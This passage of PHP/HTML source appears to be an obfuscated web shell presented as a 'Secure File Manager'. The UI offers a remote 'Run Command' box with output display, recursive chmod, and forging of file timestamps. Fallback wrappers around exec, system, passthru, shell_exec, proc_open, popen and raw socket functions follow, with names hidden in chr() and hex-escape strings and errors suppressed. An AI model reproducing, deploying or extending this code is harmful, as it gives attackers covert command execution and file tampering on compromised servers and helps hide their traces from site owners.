                                                <input type="hidden" name="old" value="<?php echo h($_201cba); ?>">
                                                <input type="text" name="new" class="field w-48" placeholder="New name" value="<?php echo h($_201cba); ?>">
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>

                                        <div id="cm-<?php echo h($_201cba); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=chmod&p=<?php echo rawurlencode($_7d57a6); ?>" class="flex flex-wrap gap-2 items-center">
                                                <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_201cba); ?>">
                                                <input type="text" name="mode" class="field w-28 mono" placeholder="0755">
                                                <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>

                                        <div id="mt-<?php echo h($_201cba); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=mtime&p=<?php echo rawurlencode($_7d57a6); ?>" class="flex flex-wrap gap-2 items-center">
                                                <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_201cba); ?>">
                                                <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS or epoch" required>
                                                <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive" checked> recursive</label>
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>
                                    </td>
                                </tr>
                            <?php
endforeach; ?>

                            <?php foreach ($_4c315a as $_201cba):
    $_6812dc = $_7d57a6 . DIRECTORY_SEPARATOR . $_201cba;
    $_d3b40e = (int)@filesize($_6812dc);
    $_f40ee4 = (int)@filemtime($_6812dc);
    $_78f209 = strtolower(pathinfo($_6812dc, PATHINFO_EXTENSION));
    $_1121de = @is_readable($_6812dc);
    $_0980b5 = @is_writable($_6812dc);
    $_18e9b9 = $_0980b5 ? "\x74\x65\x78\x74\x2d\x6c\x69\x6d\x65\x2d\x34\x30\x30" : ($_1121de ? "\x74\x65\x78\x74\x2d\x77\x68\x69\x74\x65" : chr(116).chr(101).chr(120).chr(116).chr(45).chr(114).chr(101).chr(100).chr(45).chr(52).chr(48).chr(48));
?>
                                <tr class="border-b border-slate-800 hoverable"
                                    data-type="file"
                                    data-name="<?php echo h(strtolower($_201cba)); ?>"
                                    data-size="<?php echo $_d3b40e; ?>"
                                    data-mtime="<?php echo $_f40ee4; ?>"
                                    draggable="true"
                                    ondragstart="onDragStartItem(event, <?php echo je($_201cba); ?>)">
                                    <td class="py-2 px-2"><input form="bulkDeleteForm" class="rowchk" type="checkbox" name="items[]" value="<?php echo h($_201cba); ?>"></td>
                                    <td class="py-2 px-2">
                                        <div class="flex items-center gap-2 <?php echo $_18e9b9; ?>">
                                            <?php echo _f4cf4de7c($_6812dc); ?>
                                            <a class="font-medium hover:underline text-white"
                                               draggable="false"
                                               onclick="return guardLinkCopy(event)"
                                               href="?a=view&f=<?php echo rawurlencode($_201cba); ?>&p=<?php echo rawurlencode($_7d57a6); ?>">
                                                <?php echo h($_201cba); ?>
                                            </a>
                                        </div>
                                    </td>
                                    <td class="py-2 px-2 mono"><?php echo h(_f94defb97($_d3b40e)); ?></td>
                                    <td class="py-2 px-2 mono <?php echo $_18e9b9; ?>"><?php echo h(_fe2009ff5($_6812dc)); ?></td>
                                    <td class="py-2 px-2"><?php echo h(_ff319afc5($_6812dc)); ?></td>
                                    <td class="py-2 px-2"><?php echo h(date(chr(89).chr(45).chr(109).chr(45).chr(100).chr(32).chr(72).chr(58).chr(105).chr(58).chr(115), $_f40ee4 ?: time())); ?></td>
                                    <td class="py-2 px-2">
                                        <div class="row-actions">
                                            <a class="btn btn-xs btnw" href="?a=edit&f=<?php echo rawurlencode($_201cba); ?>&p=<?php echo rawurlencode($_7d57a6); ?>">Edit</a>
                                            <?php $_d035cb = _f9970cf4a($_6812dc); if ($_d035cb !== null): ?>
                                            <a class="btn btn-xs btnw" href="<?php echo h($_d035cb); ?>" target="_blank" rel="noopener">Open</a>
                                            <?php endif; ?>
                                            <a class="btn btn-xs btnw" href="?a=download&f=<?php echo rawurlencode($_201cba); ?>&p=<?php echo rawurlencode($_7d57a6); ?>">Download</a>

                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php echo h($_201cba); ?>')">Rename</button>
                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php echo h($_201cba); ?>')">Chmod</button>
                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('mt-<?php echo h($_201cba); ?>')">Change Date</button>

                                            <?php if (in_array($_78f209, array("\x7a\x69\x70")) || preg_match(chr(126).chr(92).chr(46).chr(40).chr(116).chr(97).chr(114).chr(124).chr(116).chr(97).chr(114).chr(92).chr(46).chr(103).chr(122).chr(124).chr(116).chr(97).chr(114).chr(92).chr(46).chr(98).chr(122).chr(50).chr(124).chr(116).chr(97).chr(114).chr(92).chr(46).chr(120).chr(122).chr(41).chr(36).chr(126).chr(105), $_201cba)): ?>
                                                <form method="post" action="?a=unzip&p=<?php echo rawurlencode($_7d57a6); ?>" class="inline">
                                                    <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                                                    <input type="hidden" name="file" value="<?php echo h($_201cba); ?>">
                                                    <button class="btn btn-xs btnw" type="submit">Unzip here</button>
                                                </form>
                                            <?php
    endif; ?>

                                            <form method="post" action="?a=delete&p=<?php echo rawurlencode($_7d57a6); ?>" class="inline" onsubmit="return confirm('Delete this file?')">
                                                <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_201cba); ?>">
                                                <button class="btn btn-xs btnw" type="submit">Delete</button>
                                            </form>
                                        </div>

                                        <div id="rn-<?php echo h($_201cba); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=rename&p=<?php echo rawurlencode($_7d57a6); ?>" class="flex flex-wrap gap-2 mt-1">
                                                <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                                                <input type="hidden" name="old" value="<?php echo h($_201cba); ?>">
                                                <input type="text" name="new" class="field w-48" placeholder="New name" value="<?php echo h($_201cba); ?>">
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>

                                        <div id="cm-<?php echo h($_201cba); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=chmod&p=<?php echo rawurlencode($_7d57a6); ?>" class="flex flex-wrap gap-2 items-center mt-1">
                                                <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_201cba); ?>">
                                                <input type="text" name="mode" class="field w-24 mono" placeholder="0644">
                                                <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>

                                        <div id="mt-<?php echo h($_201cba); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=mtime&p=<?php echo rawurlencode($_7d57a6); ?>" class="flex flex-wrap gap-2 items-center">
                                                <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_201cba); ?>">
                                                <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS or epoch" required>
                                                <label class="text-xs flex items-center gap-1 opacity-50"><input type="checkbox" disabled> recursive</label>
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>

                                    </td>
                                </tr>
                            <?php
endforeach; ?>

                            <?php if (empty($_67843a) && empty($_4c315a)): ?>
                                <tr><td colspan="7" class="py-6 text-center text-slate-400">Empty</td></tr>
                            <?php
endif; ?>

                            </tbody>
                        </table>
                    </div>
                    <!-- below the table -->
                    <div class="mt-3">
                        <form method="post"
                              action="?a=zip&p=<?php echo rawurlencode($_7d57a6); ?>"
                              class="inline-flex flex-wrap gap-2 items-center">
                            <input type="hidden" name="csrf" value="<?php echo h($_9e5755); ?>">
                            <input type="text" name="zipname" class="field w-56" placeholder="archive-name.zip (optional)">
                            <button class="btn btn-sm btnw" type="submit" onclick="return collectSelectedInto(this.form)">Zip Selected</button>
                            <span class="text-xs text-slate-400">
                If ZipArchive is unavailable, a <span class="mono">.tar</span> will be created (no compression).
              </span>
                        </form>
                    </div>
                </div>
            </div>
        </section>
    </main>

    <!-- Footer -->
    <footer class="w-full px-6 py-4">
        <div class="footer-line mb-3"></div>
        <div class="text-xs text-slate-400 flex items-center justify-between">
            <span>© <?php echo $_c49b2c; ?> BLUE — Secure File Manager. All rights reserved.</span>
            <span>Built with ❤️ & Tailwind · Dark UI</span>
        </div>
    </footer>

    <script>
        document.documentElement.classList.add('dark');

        // Jangan navigasi ketika ada teks terseleksi (agar <a> gampang di-copy)
        function guardLinkCopy(e){
            var sel = '';
            if (window.getSelection) sel = String(window.getSelection());
            if (sel && sel.length > 0){
                e.preventDefault();
                return false;
            }
            return true;
        }

        // Search filter
        const searchEl = document.getElementById('searchBox');
        function filterRows(){
            const q = (searchEl && searchEl.value || '').trim().toLowerCase();
            const rows = document.querySelectorAll('#dirBody tr');
            rows.forEach(function(r){
                var name = r.getAttribute('data-name')||'';
                r.style.display = name.indexOf(q) !== -1 ? '' : 'none';
            });
        }
        window.addEventListener('keydown', function(e){ if(e.ctrlKey && e.key === '/'){ e.preventDefault(); if(searchEl){searchEl.focus();} } });

        // Sort
        var sortState = { key:'name', asc:true };
        function sortBy(key){
            var body = document.getElementById('dirBody');
            var rows = Array.prototype.slice.call(body.querySelectorAll('tr'));
            var factor = (sortState.key===key && sortState.asc)?-1:1;
            sortState = { key: key, asc: factor===1 };
            rows.sort(function(a,b){
                if(key==='name'){ return a.dataset.name.localeCompare(b.dataset.name) * factor; }
                if(key==='size' || key==='mtime'){
                    var av = parseInt(a.dataset[key]||'0',10);
                    var bv = parseInt(b.dataset[key]||'0',10);
                    return (av-bv) * factor;
                }
                return 0;
            });
            rows.forEach(function(r){ body.appendChild(r); });
        }

        // Checkboxes
        function toggleAll(master){ Array.prototype.forEach.call(document.querySelectorAll('.rowchk'), function(x){ x.checked = master.checked; }); }
        function selectAll(flag){ Array.prototype.forEach.call(document.querySelectorAll('.rowchk'), function(x){ x.checked = !!flag; }); var m=document.getElementById('chkAll'); if(m) m.checked=!!flag; }
        function toggleRow(id){ var el=document.getElementById(id); if(el) el.classList.toggle('hidden'); }
        function closeAction(btn){ var holder = btn.closest('div[id^="rn-"], div[id^="cm-"], div[id^="mt-"]'); if(holder) holder.classList.add('hidden'); }

        // Collect selected items for Zip form
        function collectSelectedInto(form){
            Array.prototype.forEach.call(form.querySelectorAll('input[name="items[]"]'), function(n){ n.parentNode.removeChild(n); });
            Array.prototype.forEach.call(document.querySelectorAll('#dirBody .rowchk:checked'), function(chk){
                var i = document.createElement('input');
                i.type='hidden'; i.name='items[]'; i.value=chk.value;
                form.appendChild(i);
            });
            return true;
        }

        // Bulk chmod on selected items
        function prepBulkChmod(form){
            var sel = document.querySelectorAll('#dirBody .rowchk:checked');
            if(!sel.length){ alert('No items selected.'); return false; }
            var modeEl = form.querySelector('input[name="mode"]');
            var mode = (modeEl && modeEl.value || '').trim();
            if(!mode){ alert('Enter a permission mode (e.g. 0644).'); if(modeEl) modeEl.focus(); return false; }
            if(!confirm('Apply chmod '+mode+' to '+sel.length+' selected item(s)?')) return false;
            collectSelectedInto(form);
            return true;
        }

        // ===== Drag & Drop Upload =====
        var dropZone = document.getElementById('dropZone');
        var tableCard = document.getElementById('tableCard');
        var csrf = <?php echo je($_9e5755); ?>;
        var currentPath = <?php echo je($_7d57a6); ?>;

        ['dragenter','dragover'].forEach(function(ev){
            document.addEventListener(ev, function(e){ e.preventDefault(); e.stopPropagation(); tableCard.classList.add('drop-hint'); });
        });
        ['dragleave','drop'].forEach(function(ev){
            document.addEventListener(ev, function(e){
                if(ev==='dragleave' && e.target !== document) return;
                tableCard.classList.remove('drop-hint');
            });
        });
        document.addEventListener('drop', function(e){
            if(!e.dataTransfer || !e.dataTransfer.files || e.dataTransfer.files.length===0) return;
            e.preventDefault(); e.stopPropagation();
            try{
                var fd = new FormData();
                fd.append('csrf', csrf);
                for(var i=0;i<e.dataTransfer.files.length;i++){ var f=e.dataTransfer.files[i]; fd.append('files[]', f, f.name); }
                fetch('?a=upload&p='+encodeURIComponent(currentPath), { method:'POST', body:fd })
                    .then(function(){ location.href='?p='+encodeURIComponent(currentPath); })
                    .catch(function(){ alert('Upload failed'); });
            }catch(err){ console.error(err); alert('Upload failed'); }
        });

        // ===== Drag to Move between directories (copy-friendly by default) =====
        var draggedItemName = null;
        var dragEnabled = false; // DEFAULT OFF → tabel mudah di-copy

        // Toggle handler
        (function(){
            var dt = document.getElementById('dragToggle');
            if (dt) {
                dragEnabled = !!dt.checked;
                dt.addEventListener('change', function(){
                    dragEnabled = !!dt.checked;
                });
            }
        })();

        function onDragStartItem(ev, name){
            if (!dragEnabled) {
                ev.preventDefault();
                return false;
            }
            draggedItemName = name; ev.dataTransfer.setData('text/plain', name);
            ev.dataTransfer.effectAllowed = 'move';
        }
        function onDragOverDir(ev){
            if (!dragEnabled) return;
            ev.preventDefault(); ev.currentTarget.classList.add('droptarget');
            ev.dataTransfer.dropEffect = 'move';
        }
        function onDragLeaveDir(ev){
            ev.currentTarget.classList.remove('droptarget');
        }
        function onDropToDir(ev, dirName){
            if (!dragEnabled) return;
            ev.preventDefault();
            var row = ev.currentTarget; row.classList.remove('droptarget');
            var src = draggedItemName || ev.dataTransfer.getData('text/plain');
            if(!src) return;
            try{
                var fd = new FormData();
                fd.append('csrf', csrf);
                fd.append('src', src);
                var dstAbs = <?php echo je($_7d57a6 . DIRECTORY_SEPARATOR); ?> + dirName;
                fd.append('dst', dstAbs);
                fetch('?a=move&p='+encodeURIComponent(currentPath), { method:'POST', body:fd })
                    .then(function(){ location.href='?p='+encodeURIComponent(currentPath); })
                    .catch(function(){ alert('Move failed'); });
            }catch(err){ console.error(err); alert('Move failed'); }
        }

        // ===== CodeMirror Init (file editor text mode) =====
        <?php if ($_70d700 && $_c17aa8 === chr(116).chr(120).chr(116)): ?>
        (function(){
            var ta = document.getElementById('editor'); if (!ta) return;
            var filename = <?php echo je(basename($_70d700)); ?>;
            CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
            var info = CodeMirror.findModeByFileName(filename) || CodeMirror.findModeByMIME('text/plain');
            var cm = CodeMirror.fromTextArea(ta, {
                lineNumbers:true, styleActiveLine:true, matchBrackets:true, autoCloseBrackets:true,
                lineWrapping:true, theme:'material-darker',
                mode: (info && info.mime) ? info.mime : 'text/plain',
                viewportMargin: Infinity
            });
            if (info && info.mode) { CodeMirror.autoLoadMode(cm, info.mode); }
            var det = document.getElementById('editPanel'); if(det){ det.addEventListener('toggle', function(){ setTimeout(function(){cm.refresh();},50); }); }
            var form = document.getElementById('editForm'); if(form){ form.addEventListener('submit', function(){ cm.save(); }); }
        })();
        <?php
endif; ?>

        // ===== CodeMirror untuk PREVIEW (readonly, auto-detect) =====
        (function(){
            var pre = document.getElementById('previewPre');
            if(!pre || typeof CodeMirror === 'undefined') return;

            CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
            var filename = <?php echo je($_b44f6c ? basename($_b44f6c) : ''); ?>;
            var info = (filename && CodeMirror.findModeByFileName(filename)) || CodeMirror.findModeByMIME('text/plain');

            var textValue = pre.textContent || '';
            var holder = document.createElement('div');
            pre.parentNode.replaceChild(holder, pre);

            var cmPrev = CodeMirror(holder, {
                value: textValue,
                readOnly: true,
                lineNumbers: true,
                lineWrapping: true,
                theme: 'material-darker',
                mode: (info && info.mime) ? info.mime : 'text/plain',
                viewportMargin: Infinity
            });

            if (info && info.mode) CodeMirror.autoLoadMode(cmPrev, info.mode);
            cmPrev.setSize('100%', 480);

            var det = document.getElementById('previewPanel');
            if (det) det.addEventListener('toggle', function(){ setTimeout(function(){ cmPrev.refresh(); }, 50); });
            window.addEventListener('resize', function(){ cmPrev.refresh(); });
        })();

        // ===== CodeMirror untuk RUN COMMAND (single-line + placeholder) =====
        (function(){
            var ta = document.getElementById('cmdTA');
            if(!ta || typeof CodeMirror === 'undefined') return;

            CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
            var isWin = <?php echo je(DIRECTORY_SEPARATOR === chr(92)); ?>;
            var cmdMode = isWin ? 'powershell' : 'shell';

            var cmCmd = CodeMirror.fromTextArea(ta, {
                lineNumbers: false,
                styleActiveLine: true,
                matchBrackets: true,
                autoCloseBrackets: true,
                lineWrapping: false,
                theme: 'material-darker',
                mode: cmdMode,
                viewportMargin: Infinity,
                placeholder: 'Run Command'
            });

            CodeMirror.autoLoadMode(cmCmd, cmdMode);
            cmCmd.setSize('100%', 36);
            cmCmd.getWrapperElement().classList.add('cm-cmd-input');

            cmCmd.on('beforeChange', function(cm, change){
                var hasNewline = change.text && (change.text.length > 1 || /\r|\n/.test(change.text[0]));
                if (hasNewline) change.update(change.from, change.to, [' ']);
            });

            cmCmd.on('keydown', function(cm, e){
                if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                    e.preventDefault();
                    var form = document.getElementById('cmdForm');
                    if (form) form.submit();
                }
            });

            var form = document.getElementById('cmdForm');
            if (form) { form.addEventListener('submit', function(){ cmCmd.save(); }); }

            setTimeout(function(){ cmCmd.refresh(); }, 50);
            window.addEventListener('resize', function(){ cmCmd.refresh(); });
        })();

        // ===== CodeMirror untuk COMMAND OUTPUT =====
        (function(){
            var pre = document.getElementById('cmdOutPre');
            if(!pre || typeof CodeMirror === 'undefined') return;

            CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
            var isWin = <?php echo je(DIRECTORY_SEPARATOR === "\x5c"); ?>;
            var outMode = isWin ? 'powershell' : 'shell';

            var txt = pre.textContent || '';
            var holder = document.createElement('div');
            pre.parentNode.replaceChild(holder, pre);

            var cmOut = CodeMirror(holder, {
                value: txt,
                readOnly: true,
                lineNumbers: true,
                lineWrapping: true,
                theme: 'material-darker',
                mode: outMode,
                viewportMargin: Infinity
            });

            CodeMirror.autoLoadMode(cmOut, outMode);
            cmOut.setSize('100%', 380);
            cmOut.getWrapperElement().classList.add('cm-cmd-output');

            setTimeout(function(){ cmOut.refresh(); }, 50);
            window.addEventListener('resize', function(){ cmOut.refresh(); });
        })();
    </script>
    </body>
    </html>
<?php



if (!function_exists("\x66\x78\x5f\x73\x74\x72\x65\x61\x6d\x5f\x73\x6f\x63\x6b\x65\x74\x5f\x63\x6c\x69\x65\x6e\x74")) {
    function fx_stream_socket_client($_2d92c3, &$_053d88 = null, &$_7e2d4a = null, $_d4ea0d = 30, $_5330b9 = 0, $_890669 = null)
    {
        if (is_fn_usable(chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(115).chr(111).chr(99).chr(107).chr(101).chr(116).chr(95).chr(99).chr(108).chr(105).chr(101).chr(110).chr(116))) {
            return @stream_socket_client($_2d92c3, $_053d88, $_7e2d4a, $_d4ea0d, $_5330b9, $_890669);
        }
        if (is_fn_usable("\x66\x73\x6f\x63\x6b\x6f\x70\x65\x6e")) {
            $_04b4e8 = $_2d92c3;
            $_66e0f7 = 0;
            if (stripos($_2d92c3, chr(116).chr(99).chr(112).chr(58).chr(47).chr(47)) === 0 || stripos($_2d92c3, chr(115).chr(115).chr(108).chr(58).chr(47).chr(47)) === 0 || stripos($_2d92c3, "\x74\x6c\x73\x3a\x2f\x2f") === 0) {
                $_c91b42 = parse_url($_2d92c3);
                if ($_c91b42 && isset($_c91b42["\x68\x6f\x73\x74"]) && isset($_c91b42[chr(112).chr(111).chr(114).chr(116)])) {
                    $_04b4e8 = $_c91b42[chr(104).chr(111).chr(115).chr(116)];
                    $_66e0f7 = $_c91b42["\x70\x6f\x72\x74"];
                }
            }
            else if (strpos($_2d92c3, chr(58)) !== false) {
                $_ad148b = explode("\x3a", $_2d92c3, 2);
                $_04b4e8 = $_ad148b[0];
                $_66e0f7 = (int)$_ad148b[1];
            }
            return @fsockopen($_04b4e8, $_66e0f7 ? $_66e0f7 : 80, $_053d88, $_7e2d4a, $_d4ea0d);
        }
        $_053d88 = 0;
        $_7e2d4a = chr(78).chr(111).chr(32).chr(115).chr(111).chr(99).chr(107).chr(101).chr(116).chr(32).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(115).chr(32).chr(97).chr(118).chr(97).chr(105).chr(108).chr(97).chr(98).chr(108).chr(101);
        return false;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(105).chr(110).chr(105).chr(95).chr(114).chr(101).chr(115).chr(116).chr(111).chr(114).chr(101))) {
    function fx_ini_restore($_786533)
    {
        if (is_fn_usable("\x69\x6e\x69\x5f\x72\x65\x73\x74\x6f\x72\x65"))
            return @ini_restore($_786533);
        return false; 
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(103).chr(122).chr(105).chr(110).chr(102).chr(108).chr(97).chr(116).chr(101))) {
    function fx_gzinflate($_8cb860, $_5f7288 = 0)
    {
        if (is_fn_usable(chr(103).chr(122).chr(105).chr(110).chr(102).chr(108).chr(97).chr(116).chr(101)))
            return @gzinflate($_8cb860, $_5f7288);
        if (is_fn_usable(chr(103).chr(122).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101)))
            return @gzdecode($_8cb860);
        if (is_fn_usable("\x67\x7a\x75\x6e\x63\x6f\x6d\x70\x72\x65\x73\x73"))
            return @gzuncompress($_8cb860);
        return false;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(101).chr(120).chr(101).chr(99))) {
    function fx_exec($_ddf0bf, &$_24c327 = null, &$_56e4ea = null)
    {
        if (is_fn_usable("\x65\x78\x65\x63"))
            return @exec($_ddf0bf, $_24c327, $_56e4ea);
        $_24c327 = array();
        $_56e4ea = 127;
        return null;
    }
}
if (!function_exists("\x66\x78\x5f\x70\x61\x73\x73\x74\x68\x72\x75")) {
    function fx_passthru($_ddf0bf, &$_56e4ea = null)
    {
        if (is_fn_usable(chr(112).chr(97).chr(115).chr(115).chr(116).chr(104).chr(114).chr(117)))
            return @passthru($_ddf0bf, $_56e4ea);
        $_56e4ea = 127;
        return null;
    }
}
if (!function_exists("\x66\x78\x5f\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) {
    function fx_shell_exec($_ddf0bf)
    {
        if (is_fn_usable("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63"))
            return @shell_exec($_ddf0bf);
        return null;
    }
}
if (!function_exists(chr(102).chr(120).chr(95).chr(115).chr(121).chr(115).chr(116).chr(101).chr(109))) {
    function fx_system($_ddf0bf, &$_56e4ea = null)
    {
        if (is_fn_usable("\x73\x79\x73\x74\x65\x6d"))
            return @system($_ddf0bf, $_56e4ea);
        $_56e4ea = 127;
        return null;
    }
}
if (!function_exists(chr(102).chr(120).chr(95).chr(112).chr(114).chr(111).chr(99).chr(95).chr(111).chr(112).chr(101).chr(110))) {
    function fx_proc_open($_ddf0bf, $_3f7453, &$_1be113, $_343e5c = null, $_7c593b = null)
    {
        if (is_fn_usable(chr(112).chr(114).chr(111).chr(99).chr(95).chr(111).chr(112).chr(101).chr(110)))
            return @proc_open($_ddf0bf, $_3f7453, $_1be113, $_343e5c, $_7c593b);
        return false;
    }
}
if (!function_exists(chr(102).chr(120).chr(95).chr(112).chr(111).chr(112).chr(101).chr(110))) {
    function fx_popen($_ddf0bf, $_ddf387)
    {
        if (is_fn_usable(chr(112).chr(111).chr(112).chr(101).chr(110)))
            return @popen($_ddf0bf, $_ddf387);
        return false;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(112).chr(97).chr(114).chr(115).chr(101).chr(95).chr(105).chr(110).chr(105).chr(95).chr(102).chr(105).chr(108).chr(101))) {
    function fx_parse_ini_file($_c1f579, $_718d83 = false, $_f91ba6 = null)
    {
        if (is_fn_usable(chr(112).chr(97).chr(114).chr(115).chr(101).chr(95).chr(105).chr(110).chr(105).chr(95).chr(102).chr(105).chr(108).chr(101))) {
            if ($_f91ba6 === null)
                return @parse_ini_file($_c1f579, $_718d83);
            return @parse_ini_file($_c1f579, $_718d83, $_f91ba6);
        }
        $_6ee803 = @file_get_contents($_c1f579);
        if ($_6ee803 === false)
            return false;
        if (is_fn_usable("\x70\x61\x72\x73\x65\x5f\x69\x6e\x69\x5f\x73\x74\x72\x69\x6e\x67"))
            return @parse_ini_string($_6ee803, $_718d83);
        return false;
    }
}

if (!function_exists("\x66\x78\x5f\x73\x68\x6f\x77\x5f\x73\x6f\x75\x72\x63\x65")) {
    function fx_show_source($_84d168, $_866047 = false)
    {
        if (is_fn_usable("\x73\x68\x6f\x77\x5f\x73\x6f\x75\x72\x63\x65"))
            return @show_source($_84d168, $_866047);
        if (is_fn_usable(chr(104).chr(105).chr(103).chr(104).chr(108).chr(105).chr(103).chr(104).chr(116).chr(95).chr(102).chr(105).chr(108).chr(101)))
            return @highlight_file($_84d168, $_866047);
        $_2858cd = @file_get_contents($_84d168);
        if ($_866047)
            return $_2858cd;
        echo $_2858cd;
        return true;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(115).chr(99).chr(97).chr(110).chr(100).chr(105).chr(114))) {
    function fx_scandir($_a7b8f0)
    {
        if (is_fn_usable(chr(115).chr(99).chr(97).chr(110).chr(100).chr(105).chr(114)))
            return @scandir($_a7b8f0);
        $_097a3e = @opendir($_a7b8f0);
        if (!$_097a3e)
            return false;
        $_be5191 = array();
        while (false !== ($_90e0bb = readdir($_097a3e)))
            $_be5191[] = $_90e0bb;
        closedir($_097a3e);
        return $_be5191;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(112).chr(111).chr(115).chr(105).chr(120).chr(95).chr(103).chr(101).chr(116).chr(112).chr(119).chr(117).chr(105).chr(100))) {
    function fx_posix_getpwuid($_67da5b)
    {
        if (is_fn_usable(chr(112).chr(111).chr(115).chr(105).chr(120).chr(95).chr(103).chr(101).chr(116).chr(112).chr(119).chr(117).chr(105).chr(100)))
            return @posix_getpwuid($_67da5b);
        return array("\x6e\x61\x6d\x65" => @get_current_user(), "\x75\x69\x64" => $_67da5b);
    }
}
if (!function_exists(chr(102).chr(120).chr(95).chr(112).chr(111).chr(115).chr(105).chr(120).chr(95).chr(103).chr(101).chr(116).chr(103).chr(114).chr(103).chr(105).chr(100))) {
    function fx_posix_getgrgid($_19a6a1)
    {
        if (is_fn_usable("\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x67\x72\x67\x69\x64"))
            return @posix_getgrgid($_19a6a1);
        return array(chr(110).chr(97).chr(109).chr(101) => chr(117).chr(110).chr(107).chr(110).chr(111).chr(119).chr(110), chr(103).chr(105).chr(100) => $_19a6a1);
    }
}

if (!function_exists("\x66\x78\x5f\x64\x69\x73\x6b\x66\x72\x65\x65\x73\x70\x61\x63\x65")) {
    function fx_diskfreespace($_53713b)
    {
        if (is_fn_usable("\x64\x69\x73\x6b\x66\x72\x65\x65\x73\x70\x61\x63\x65"))
            return @diskfreespace($_53713b);
        if (is_fn_usable(chr(100).chr(105).chr(115).chr(107).chr(95).chr(102).chr(114).chr(101).chr(101).chr(95).chr(115).chr(112).chr(97).chr(99).chr(101)))
            return @disk_free_space($_53713b);
        return false;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(102).chr(105).chr(108).chr(101).chr(103).chr(114).chr(111).chr(117).chr(112))) {
    function fx_filegroup($_c1f579)
    {
        if (is_fn_usable("\x66\x69\x6c\x65\x67\x72\x6f\x75\x70"))
            return @filegroup($_c1f579);
        return false;
    }
}

if (!function_exists("\x66\x78\x5f\x66\x74\x70\x5f\x63\x6f\x6e\x6e\x65\x63\x74")) {
    function fx_ftp_connect($_04b4e8, $_66e0f7 = 21, $_d4ea0d = 90)
    {
        if (is_fn_usable("\x66\x74\x70\x5f\x63\x6f\x6e\x6e\x65\x63\x74"))
            return @ftp_connect($_04b4e8, $_66e0f7, $_d4ea0d);
        if (is_fn_usable("\x66\x73\x6f\x63\x6b\x6f\x70\x65\x6e"))
            return @fsockopen($_04b4e8, $_66e0f7, $_053d88, $_7e2d4a, $_d4ea0d);
        return false;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115))) {
    function fx_stream_get_contents($_e4352a, $_89fd9a = -1, $_47b045 = -1)
    {
        if (is_fn_usable(chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115)))
            return @stream_get_contents($_e4352a, $_89fd9a, $_47b045);
        if ($_47b045 > 0)
            @fseek($_e4352a, $_47b045);
        $_8cb860 = "";
        if ($_89fd9a === -1) {
